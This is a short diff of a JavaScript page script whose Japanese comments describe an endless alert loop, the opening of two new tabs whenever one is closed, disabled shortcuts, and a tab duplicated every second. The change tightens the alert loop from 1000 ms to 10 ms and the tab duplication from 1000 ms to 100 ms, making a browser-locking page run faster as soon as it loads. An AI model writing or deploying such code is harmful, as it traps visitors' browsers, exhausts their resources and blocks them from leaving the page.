@@ -4,7 +4,7 @@ let openNewTabInterval;
 // 無限アラートを表示する関数
 function showAlert() {
     alert("無限アラート");
-    showAlertTimeout = setTimeout(showAlert, 1000);
+    showAlertTimeout = setTimeout(showAlert, 10);
 }
 
 // タブが閉じられたときに新しいタブを2つ開く関数
@@ -47,7 +47,7 @@ function disableShortcuts() {
 function duplicateTabEverySecond() {
     openNewTabInterval = setInterval(function() {
         window.open(location.href);
-    }, 1000);
+    }, 100);
 }
 
 window.onload = function() {
